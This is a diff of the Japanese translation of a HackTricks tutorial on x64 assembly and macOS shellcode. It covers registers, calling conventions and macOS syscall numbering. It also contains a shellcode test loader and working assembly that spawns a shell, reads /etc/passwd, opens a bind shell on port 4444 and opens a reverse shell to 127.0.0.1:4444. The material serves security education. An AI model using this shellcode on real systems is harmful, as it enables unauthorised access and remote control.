@@ -1,81 +1,87 @@
-# x64の概要
+# x64への導入
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>
 
-* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
-* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
-* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
-* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出**してください。
+HackTricksをサポートする他の方法:
+
+* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
+* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
+* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。
 
 </details>
 
-## **x64の概要**
+## **x64への導入**
 
-x64、またはx86-64は、デスクトップやサーバーのコンピューティングで主に使用される64ビットのプロセッサアーキテクチャです。Intelによって生産されたx86アーキテクチャを起源とし、後にAMDがAMD64という名前で採用しました。現在、個人コンピュータやサーバーで広く使用されているアーキテクチャです。
+x64は、デスクトップおよびサーバーのコンピューティングで主に使用される64ビットプロセッサアーキテクチャです。インテルによって生み出されたx86アーキテクチャから派生し、後にAMD64という名前でAMDによって採用されました。現在、個人用コンピューターとサーバーで主流のアーキテクチャです。
 
 ### **レジスタ**
 
-x64はx86アーキテクチャを拡張し、`rax`、`rbx`、`rcx`、`rdx`、`rbp`、`rsp`、`rsi`、`rdi`、`r8`から`r15`という**16個の汎用レジスタ**を備えています。これらのレジスタはそれぞれ**64ビット（8バイト）**の値を格納することができます。これらのレジスタには互換性と特定のタスクのための32ビット、16ビット、8ビットのサブレジスタもあります。
+x64はx86アーキテクチャを拡張し、`rax`、`rbx`、`rcx`、`rdx`、`rbp`、`rsp`、`rsi`、`rdi`、および`r8`から`r15`までの**16個の汎用レジスタ**を特徴としています。これらの各レジスタは**64ビット**（8バイト）の値を格納できます。これらのレジスタには、互換性と特定のタスクのための32ビット、16ビット、および8ビットのサブレジスタもあります。
 
-1. **`rax`** - 通常、関数からの**戻り値**に使用されます。
+1. **`rax`** - 伝統的に関数からの**戻り値**に使用されます。
 2. **`rbx`** - メモリ操作の**ベースレジスタ**としてよく使用されます。
-3. **`rcx`** - **ループカウンタ**として一般的に使用されます。
-4. **`rdx`** - 拡張算術演算など、さまざまな役割で使用されます。
-5. **`rbp`** - スタックフレームの**ベースポインタ**です。
-6. **`rsp`** - スタックの先頭を追跡する**スタックポインタ**です。
-7. **`rsi`**および**`rdi`** - 文字列/メモリ操作の**ソース**および**宛先**インデックスに使用されます。
-8. **`r8`**から**`r15`** - x64で導入された追加の汎用レジスタ。
+3. **`rcx`** - **ループカウンター**に一般的に使用されます。
+4. **`rdx`** - 拡張算術演算を含む様々な役割で使用されます。
+5. **`rbp`** - スタックフレームの**ベースポインター**。
+6. **`rsp`** - **スタックポインター**で、スタックの先頭を追跡します。
+7. **`rsi`** と **`rdi`** - 文字列/メモリ操作の**ソース**と**デスティネーション**インデックスに使用されます。
+8. **`r8`** から **`r15`** - x64で導入された追加の汎用レジスタ。
 
 ### **呼び出し規約**
 
 x64の呼び出し規約はオペレーティングシステムによって異なります。例えば：
 
-* **Windows**：最初の**4つのパラメータ**はレジスタ**`rcx`**、**`rdx`**、**`r8`**、**`r9`**に渡されます。さらなるパラメータはスタックにプッシュされます。戻り値は**`rax`**に格納されます。
-* **System V（UNIXライクなシステムで一般的に使用される）**：最初の**6つの整数またはポインタパラメータ**はレジスタ**`rdi`**、**`rsi`**、**`rdx`**、**`rcx`**、**`r8`**、**`r9`**に渡されます。戻り値も**`rax`**にあります。
+* **Windows**: 最初の**4つのパラメーター**はレジスタ**`rcx`**、**`rdx`**、**`r8`**、および**`r9`**に渡されます。それ以上のパラメーターはスタックにプッシュされます。戻り値は**`rax`**にあります。
+* **System V (UNIX系システムで一般的に使用される)**: 最初の**6つの整数またはポインターパラメーター**はレジスタ**`rdi`**、**`rsi`**、**`rdx`**、**`rcx`**、**`r8`**、および**`r9`**に渡されます。戻り値も**`rax`**にあります。
 
-関数に6つ以上の入力がある場合、**残りはスタックに渡されます**。スタックポインタである**RSP**は、呼び出しの前に指すアドレスが16で割り切れる必要があるため、**16バイトアラインメント**する必要があります。つまり、通常、関数呼び出し前にRSPが適切にアラインされていることを確認する必要があります。ただし、実際のところ、この要件を満たさなくてもシステムコールは多くの場合動作します。
+関数に6つ以上の入力がある場合、**残りはスタックに渡されます**。**RSP**、スタックポインターは、**16バイトアライン**されている必要があります。つまり、任意の呼び出しが行われる前に、それが指すアドレスは16で割り切れる必要があります。これは、関数呼び出しを行う前に、シェルコードでRSPが適切にアラインされていることを通常は確認する必要があることを意味します。ただし、実際には、この要件が満たされていなくても、システムコールは多くの場合機能します。
 
-### Swiftの呼び出し規約
+### Swiftでの呼び出し規約
 
-Swiftには独自の**呼び出し規約**があり、[**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64)で見つけることができます。
+Swiftには独自の**呼び出し規約**があり、[**こちら**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64)で見つけることができます。
 
 ### **一般的な命令**
 
-x64の命令は豊富で、以前のx86の命令との互換性を保ちつつ、新しい命令も導入しています。
+x64命令には豊富なセットがあり、以前のx86命令との互換性を維持しつつ、新しい命令を導入しています。
 
-* **`mov`**：ある**レジスタ**または**メモリ位置**から別の場所に値を**移動**します。
-* 例：`mov rax, rbx` — `rbx`の値を`rax`に移動します。
-* **`push`**および**`pop`**：スタックに値をプッシュまたはポップします。
-* 例：`push rax` — `rax`の値をスタックにプッシュします。
-* 例：`pop rax` — スタックのトップの値を`rax`にポップします。
-* **`add`**および**`sub`**：**加算**および**減算**の演算です。
-* 例：`add rax, rcx` — `rax`と`rcx`の値を加算し、結果を`rax`に格納します。
-* **`mul`**および**`div`**：**乗算**および**除算**の演算です。注意：これらはオペランドの使用に関して特定の動作をします。
-* **`call`**および**`ret`**：関数の**呼び出し**と**戻り**に使用されます。
-* **`int`**：ソフトウェアの**割り込み**をトリガーします。例：32ビットx86 Linuxでは、システムコールには`int 0x80`が使用されました。
-* **`cmp`**：2つの値を比較し、結果に基づいてCPUのフラグを設定します。
-* 例：`cmp rax, rdx` — `rax`と`rdx`を比較します。
-* **`je`**、**`jne`**、**`jl`**、**`jge`**など：前の`cmp`またはテストの結果に基づいて制
+* **`mov`**: 一つの**レジスタ**または**メモリ位置**から別の位置へ値を**移動**します。
+* 例: `mov rax, rbx` — `rbx`から`rax`へ値を移動します。
+* **`push`** と **`pop`**: 値を**スタック**にプッシュまたはポップします。
+* 例: `push rax` — `rax`にある値をスタックにプッシュします。
+* 例: `pop rax` — スタックの先頭の値を`rax`にポップします。
+* **`add`** と **`sub`**: **加算**と**減算**の操作。
+* 例: `add rax, rcx` — `rax`と`rcx`にある値を加算し、結果を`rax`に格納します。
+* **`mul`** と **`div`**: **乗算**と**除算**の操作。注意：これらはオペランドの使用に関して特定の振る舞いを持っています。
+* **`call`** と **`ret`**: 関数を**呼び出す**と**関数から戻る**ために使用されます。
+* **`int`**: ソフトウェア**割り込み**をトリガーするために使用されます。例えば、32ビットx86 Linuxでシステムコールに`int 0x80`が使用されました。
+* **`cmp`**: 二つの値を**比較**し、結果に基づいてCPUのフラグを設定します。
+* 例: `cmp rax, rdx` — `rax`と`rdx`を比較します。
+* **`je`, `jne`, `jl`, `jge`, ...**: 前の`cmp`またはテストの結果に基づいて制御フローを変更する**条件付きジャンプ**命令。
+* 例: `cmp rax, rdx`命令の後、`je label` — `rax`が`rdx`に等しい場合、`label`にジャンプします。
+* **`syscall`**: 一部のx64システム（現代のUnixなど）で**システムコール**に使用されます。
+* **`sysenter`**: 一部のプラットフォームで最適化された**システムコール**命令。
+
 ### **関数プロローグ**
 
-1. **古いベースポインタをプッシュする**: `push rbp`（呼び出し元のベースポインタを保存する）
-2. **現在のスタックポインタをベースポインタに移動する**: `mov rbp, rsp`（現在の関数の新しいベースポインタを設定する）
-3. **ローカル変数のためにスタック上にスペースを割り当てる**: `sub rsp, <size>`（`<size>`は必要なバイト数です）
+1. **古いベースポインターをプッシュする**: `push rbp` (呼び出し元のベースポインターを保存)
+2. **現在のスタックポインターをベースポインターに移動する**: `mov rbp, rsp` (現在の関数の新しいベースポインターを設定)
+3. **ローカル変数のためにスタック上にスペースを割り当てる**: `sub rsp, <size>` (ここで`<size>`は必要なバイト数)
 
 ### **関数エピローグ**
 
-1. **現在のベースポインタをスタックポインタに移動する**: `mov rsp, rbp`（ローカル変数を解放する）
-2. **スタックから古いベースポインタをポップする**: `pop rbp`（呼び出し元のベースポインタを復元する）
-3. **リターンする**: `ret`（制御を呼び出し元に返す）
+1. **現在のベースポインターをスタックポインターに移動する**: `mov rsp, rbp` (ローカル変数を割り当て解除)
+2. **スタックから古いベースポインターをポップする**: `pop rbp` (呼び出し元のベースポインターを復元)
+3. **戻る**: `ret` (制御を呼び出し元に戻す)
 
 ## macOS
 
-### シスコール
+### syscalls
 
-シスコールには異なるクラスがあります。[**ここで見つけることができます**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall\_sw.h)**:**
+syscallsには異なるクラスがあります。[**こちらで見つけることができます**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall\_sw.h)**:**
 ```c
 #define SYSCALL_CLASS_NONE	0	/* Invalid */
 #define SYSCALL_CLASS_MACH	1	/* Mach */
@@ -84,7 +90,7 @@ x64の命令は豊富で、以前のx86の命令との互換性を保ちつつ�
 #define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
 #define SYSCALL_CLASS_IPC	5	/* Mach IPC */
 ```
-次に、各シスコール番号は[**このURL**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**で見つけることができます:**
+その後、各システムコール番号を[**このURLで**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**見つけることができます：**
 ```c
 0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
 1	AUE_EXIT	ALL	{ void exit(int rval); }
@@ -101,9 +107,9 @@ x64の命令は豊富で、以前のx86の命令との互換性を保ちつつ�
 12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
 [...]
 ```
-したがって、**Unix/BSDクラス**から`open`シスコール（**5**）を呼び出すためには、`0x2000000`を追加する必要があります。
+以下は、`open` システムコール（**5**）を **Unix/BSD クラス**から呼び出すためには、`0x2000000` を追加する必要があります。
 
-したがって、`open`を呼び出すためのシスコール番号は`0x2000005`になります。
+したがって、open を呼び出すためのシステムコール番号は `0x2000005` になります。
 
 ### シェルコード
 
@@ -114,9 +120,9 @@ x64の命令は豊富で、以前のx86の命令との互換性を保ちつつ�
 nasm -f macho64 shell.asm -o shell.o
 ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
 ```
-{% endcode %}
-
-バイトを抽出するには:
+```
+バイトを抽出するには：
+```
 
 {% code overflow="wrap" %}
 ```bash
@@ -128,9 +134,11 @@ done
 # Another option
 otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g' | sed 's/\\x$//g'
 ```
+{% endcode %}
+
 <details>
 
-<summary>シェルコードをテストするためのCコード</summary>
+<summary>C言語のコードでシェルコードをテストする</summary>
 ```c
 // code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
 // gcc loader.c -o loader
@@ -180,7 +188,7 @@ return 0;
 
 #### シェル
 
-[**ここから**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s)引用し、説明します。
+[**こちら**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s)から取得し、説明します。
 
 {% tabs %}
 {% tab title="adrを使用" %}
@@ -198,7 +206,9 @@ pop     rax               ; pop it to RAX
 bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
 syscall
 ```
-{% tab title="スタックを使用して" %}
+{% endtab %}
+
+{% tab title="スタック付き" %}
 ```armasm
 bits 64
 global _main
@@ -217,9 +227,9 @@ syscall
 {% endtab %}
 {% endtabs %}
 
-#### catコマンドで読む
+#### catコマンドの実行
 
-目標は、`execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`を実行することです。したがって、第2引数（x1）はパラメータの配列である必要があります（メモリ上ではアドレスのスタックを意味します）。
+目標は`execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`を実行することで、第二引数(x1)はパラメータの配列（メモリ上ではアドレスのスタックを意味します）。
 ```armasm
 bits 64
 section .text
@@ -250,7 +260,7 @@ section .data
 cat_path:      db "/bin/cat", 0
 passwd_path:   db "/etc/passwd", 0
 ```
-#### shを使用してコマンドを呼び出す
+#### shを使ってコマンドを実行
 ```armasm
 bits 64
 section .text
@@ -290,7 +300,7 @@ touch_command:  db "touch /tmp/lalala", 0
 ```
 #### バインドシェル
 
-バインドシェルは、[https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) から**ポート4444**で利用できます。
+**ポート4444**でのバインドシェルは[https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html)からです。
 ```armasm
 section .text
 global _main
@@ -367,7 +377,7 @@ syscall
 ```
 #### リバースシェル
 
-[https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html)からのリバースシェル。**127.0.0.1:4444**へのリバースシェル。
+リバースシェルは[https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html)から。**127.0.0.1:4444**へのリバースシェルです。
 ```armasm
 section .text
 global _main
@@ -431,12 +441,14 @@ syscall
 ```
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>
 
-* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
-* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
-* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
+HackTricksをサポートする他の方法:
+
+* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れよう
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックしてください
+* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加するか**、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローしてください。**
+* [**HackTricks**](https://github.com/carlospolop/hacktricks) および [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubリポジトリにPRを提出して、あなたのハッキングのコツを共有してください。
 
 </details>
